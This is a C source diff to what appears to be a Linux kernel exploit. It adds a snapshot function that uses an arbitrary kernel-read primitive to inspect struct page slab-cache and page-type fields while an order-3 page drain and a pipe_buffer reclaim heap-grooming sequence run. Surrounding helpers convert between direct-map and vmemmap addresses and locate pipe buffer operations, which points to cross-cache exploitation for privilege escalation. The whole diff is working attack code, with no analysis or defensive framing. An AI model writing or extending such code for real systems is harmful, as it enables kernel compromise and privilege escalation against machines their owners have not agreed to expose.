@@ -136,6 +136,9 @@ struct pipe_order3_state {
   unsigned char *payload;
 };
 
+static void pipe_reclaim_snapshot(
+    const char *phase, uintptr_t base, size_t allocations);
+
 static struct pipe_order3_state *pipe_prepare_order3_probes(void) {
   struct pipe_order3_state *state = calloc(1, sizeof(*state));
   if (!state)
@@ -262,6 +265,8 @@ static int pipe_stage_exact_order3(uintptr_t base,
           captured, allocated,
           state->probes[guard].sv[0] >= 0 ? guard : -1,
           PIPE_DRAIN, drained);
+  pipe_reclaim_snapshot(drained ? "skb-freed" : "skb-drain-incomplete",
+                        base, 0);
   return drained;
 }
 
@@ -299,8 +304,14 @@ static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
   if (!pipe_stage_exact_order3(base, order3_state))
     return 0;
 
-  for (size_t i = 0; i < PIPE_RECLAIM; i++)
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     alloc_pipe_object(pipe_fds_reclaim[i]);
+    size_t allocations = i + 1;
+    if (allocations == PIPE_DRAIN || allocations == PIPE_DRAIN + 1 ||
+        allocations == PIPE_RECLAIM) {
+      pipe_reclaim_snapshot("pipe-growth", base, allocations);
+    }
+  }
 
   unsigned long slabs_after = controlled_mm_slab_count();
   pr_info("controlled pipe reclaim base=%016zx drain=%d reclaim=%d anchor=%d slabs=%lu->%lu\n",
@@ -572,6 +583,42 @@ uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
 uintptr_t page_to_direct(uintptr_t page) {
   uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
   return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
+}
+
+static void pipe_reclaim_snapshot(
+    const char *phase, uintptr_t base, size_t allocations) {
+  uintptr_t seen[ORDER3_SIZE / PAGE_SIZE];
+  size_t seen_count = 0;
+  for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
+    uintptr_t page = base + off;
+    uintptr_t head = direct_to_head_page(-1, page);
+    int duplicate = 0;
+    for (size_t i = 0; i < seen_count; i++) {
+      if (seen[i] == head) {
+        duplicate = 1;
+        break;
+      }
+    }
+    if (duplicate)
+      continue;
+    seen[seen_count++] = head;
+
+    uint64_t slab_cache = 0;
+    uint64_t page_type = 0;
+    errno = 0;
+    ssize_t cache_ret = kernel_read_data(
+        -1, head + STRUCT_SLAB_CACHE_OFF, &slab_cache, sizeof(slab_cache));
+    int cache_errno = errno;
+    errno = 0;
+    ssize_t type_ret = kernel_read_data(
+        -1, head + STRUCT_PAGE_TYPE_OFF, &page_type, sizeof(page_type));
+    int type_errno = errno;
+    pr_info("pipe reclaim snapshot phase=%s alloc=%zu page_off=%#zx "
+            "head=%016zx cache=%zd/%d:%016llx type=%zd/%d:%08x\n",
+            phase, allocations, off, head, cache_ret, cache_errno,
+            (unsigned long long)slab_cache, type_ret, type_errno,
+            (uint32_t)page_type);
+  }
 }
 
 uintptr_t pipe_buf_ops_addr(void) {
